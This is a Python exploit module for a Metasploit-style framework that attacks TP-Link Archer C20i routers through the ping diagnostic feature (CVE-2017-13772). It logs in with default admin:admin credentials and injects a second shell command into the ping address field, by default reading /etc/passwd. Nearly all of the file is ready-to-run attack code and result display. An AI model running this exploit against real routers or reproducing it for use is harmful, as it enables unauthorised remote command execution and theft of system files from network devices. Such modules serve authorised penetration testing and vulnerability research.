#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
TP-Link Archer C20i Remote Code Execution
CVE-2017-13772
"""

import requests
import urllib.parse
import base64

MODULE_INFO = {
    "name": "TP-Link Archer C20i RCE",
    "description": "Remote Code Execution via Ping feature in TP-Link Archer C20i routers",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "linux",
    "rank": "Excellent",
    "references": [
        "CVE-2017-13772",
        "https://www.exploit-db.com/exploits/42660"
    ],
    "dependencies": ["requests"]
}

OPTIONS = {
    "RHOST": {
        "description": "Target router IP address",
        "required": True,
        "default": "192.168.0.1"
    },
    "RPORT": {
        "description": "Target router port",
        "required": False,
        "default": "80"
    },
    "USERNAME": {
        "description": "Username for authentication",
        "required": False,
        "default": "admin"
    },
    "PASSWORD": {
        "description": "Password for authentication",
        "required": False,
        "default": "admin"
    },
    "CMD": {
        "description": "Command to execute",
        "required": True,
        "default": "cat /etc/passwd"
    },
    "SSL": {
        "description": "Use SSL",
        "required": False,
        "default": "false"
    }
}

class TPLinkArcherRCE:
    def __init__(self, target, port=80, username="admin", password="admin", ssl=False):
        self.target = target
        self.port = port
        self.username = username
        self.password = password
        self.protocol = "https" if ssl else "http"
        self.base_url = f"{self.protocol}://{target}:{port}"
        self.session = requests.Session()
        self.session.verify = False
        
    def login(self):
        """Login to router admin panel"""
        try:
            login_data = {
                "username": self.username,
                "password": self.password,
                "cpassword": "",
                "logon": "Login"
            }
            
            login_url = f"{self.base_url}/cgi-bin/luci"
            response = self.session.post(login_url, data=login_data, timeout=10)
            
            return "success" in response.text or response.status_code == 200
            
        except Exception as e:
            return False
    
    def execute_command(self, command):
        """Execute command via ping feature RCE"""
        try:
            # The vulnerability is in the ping functionality
            payload = f"127.0.0.1; {command}"
            
            exploit_data = {
                "ping_addr": payload,
                "do_ping": "Ping"
            }
            
            exploit_url = f"{self.base_url}/cgi-bin/luci/admin/network/diagnostics/ping"
            response = self.session.post(exploit_url, data=exploit_data, timeout=10)
            
            return response.text
            
        except Exception as e:
            return f"Error: {str(e)}"

def display_exploit_info():
    """Display exploit information in Metasploit style"""
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    
    console = Console()
    
    table = Table(show_header=True, header_style="bold red", box=None)
    table.add_column("Module", style="bold yellow")
    table.add_column("Details", style="white")
    
    table.add_row("Name", MODULE_INFO["name"])
    table.add_row("Module", "exploit/linux/router/tplink_archer_rce")
    table.add_row("Disclosure", "2017-09-13")
    table.add_row("Platform", MODULE_INFO["platform"])
    table.add_row("Arch", "mips")
    table.add_row("Rank", MODULE_INFO["rank"])
    
    console.print(Panel(table, title="Exploit Information", border_style="red"))
    
    # Description
    desc_panel = Panel(
        MODULE_INFO["description"],
        title="Description",
        border_style="green"
    )
    console.print(desc_panel)
    
    # References
    if MODULE_INFO["references"]:
        ref_text = "\n".join([f"  {ref}" for ref in MODULE_INFO["references"]])
        console.print(Panel(ref_text, title="References", border_style="yellow"))

def run(session, options):
    """Main exploit function"""
    from rich.console import Console
    from rich.panel import Panel
    from rich.syntax import Syntax
    from rich.table import Table
    
    console = Console()
    
    # Display exploit info
    display_exploit_info()
    
    # Display options
    current_options = OPTIONS.copy()
    for key in current_options:
        if key in options:
            current_options[key]['value'] = options[key]
    
    table = Table(show_header=True, header_style="bold magenta", box=None)
    table.add_column("Name", style="bold cyan")
    table.add_column("Current Setting", style="green")
    table.add_column("Required", style="yellow")
    table.add_column("Description", style="white")
    
    for name, config in current_options.items():
        current = config.get('value', config.get('default', ''))
        required = "yes" if config.get('required', False) else "no"
        description = config.get('description', '')
        
        table.add_row(name, str(current), required, description)
    
    console.print(Panel(table, title="Module Options (exploit/linux/router/tplink_archer_rce)", border_style="blue"))
    
    # Get options
    rhost = options.get("RHOST", "192.168.0.1")
    rport = options.get("RPORT", "80")
    username = options.get("USERNAME", "admin")
    password = options.get("PASSWORD", "admin")
    cmd = options.get("CMD", "cat /etc/passwd")
    ssl = options.get("SSL", "false").lower() == "true"
    
    console.print(f"\n[bold yellow][*][/bold yellow] Target: [cyan]{rhost}:{rport}[/cyan]")
    console.print(f"[bold yellow][*][/bold yellow] Credentials: [cyan]{username}:{password}[/cyan]")
    console.print(f"[bold yellow][*][/bold yellow] Command: [red]{cmd}[/red]")
    
    try:
        # Initialize exploit
        exploit = TPLinkArcherRCE(rhost, rport, username, password, ssl)
        
        console.print("\n[bold yellow][*][/bold yellow] Attempting to login...")
        if exploit.login():
            console.print("[bold green][+][/bold green] Login successful!")
            
            console.print("[bold yellow][*][/bold yellow] Executing command via RCE...")
            result = exploit.execute_command(cmd)
            
            if result and "Error" not in result:
                console.print("[bold green][+][/bold green] Command executed successfully!")
                
                # Display result
                syntax = Syntax(result, "text", theme="monokai", line_numbers=True)
                console.print(Panel(syntax, title="Command Output", border_style="green"))
                
            else:
                console.print("[red][-][/red] Command execution failed")
                if result:
                    console.print(f"[red]Error: {result}[/red]")
                    
        else:
            console.print("[red][-][/bold red] Login failed! Check credentials")
            
    except Exception as e:
        console.print(f"[red][-][/red] Exploit failed: {str(e)}")
